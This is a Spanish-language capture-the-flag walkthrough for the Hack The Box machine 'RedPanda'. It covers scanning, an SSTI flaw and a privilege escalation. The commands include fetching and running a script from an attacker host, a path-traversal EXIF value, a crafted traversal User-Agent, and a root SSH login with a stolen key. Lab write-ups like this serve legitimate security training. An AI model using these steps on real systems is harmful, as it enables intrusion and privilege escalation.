# Walkthrough para la Máquina "RedPanda" en Hack The Box

Este es un paso a paso detallado de cómo comprometí la máquina RedPanda en Hack The Box. Agradecimientos especiales a [gatogamer1155](https://gatogamer1155.github.io/hackthebox/redpanda/) por proporcionar una solución que me guió en mi proceso.

## Escaneo Inicial

- **Nmap:**
  ```
  nmap -p 22,8080 -sC -sV -oN nmap_scan.txt 10.10.11.170
  ```
  Resultado:
  - Puerto 22 (SSH) abierto.
  - Puerto 8080 (HTTP-Proxy) abierto.

- **Gobuster y WhatWeb:**
  ```
  gobuster dir -u http://10.10.11.170:8080 -w /usr/share/wordlists/dirb/common.txt
  whatweb http://10.10.11.170:8080
  ```
  Resultado:
  - No se obtuvo ninguna información útil.

## Identificación de Vulnerabilidades

- **Vulnerabilidad Encontrada:**
  - Se identificó una vulnerabilidad de Inyección de Plantillas del Lado del Servidor (Server Side Template Injection - SSTI).

- **Payload Utilizado:**
  ```
  python3 payload.py
  ```

## Escalada de Privilegios

1. **Acceso a Usuario:**
   ```
   cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
   ```

2. **Transferencia de Script Python:**
   ```
   wget http://10.10.16.23:8000/sell2.py
   chmod 755 sell2.py
   python3 sell2.py
   ```

3. **Exfiltración de Credenciales:**
   ```
   wget (imagen jpg aleatoria) gaton.jpg
   exiftool -Artist="../home/woodenk/privesc" gaton.jpg
   scp gaton.jpg woodenk@10.10.11.170:.
   ```

4. **Creación de Archivo XML:**
   ```
   cat privesc_creds.xml
   ```

5. **Carga de Archivo XML y Petición Curl:**
   ```
   curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/gaton.jpg"
   ```

6. **Visualización de Archivo XML Modificado:**
   ```
   cat privesc_creds.xml
   ```

7. **Conexión SSH con la Clave Privada:**
   ```
   ssh root@10.10.11.170 -i id_rsa
   ```

8. **Visualización de la Flag:**
   ```
   cat root.txt
   ```

## Notas Finales

- Copié la clave SSH, creé un archivo llamado "id_rsa" y lo moví a ~/.ssh.
  ```
  chmod 400 ~/.ssh/id_rsa
  ```

- Esto fue necesario para evitar problemas de permisos al intentar conectarme por SSH.

Este walkthrough proporciona una descripción estructurada de mi proceso para comprometer la máquina RedPanda en Hack The Box. ¡Espero que sea útil y te inspire a mejorar tus habilidades en ciberseguridad!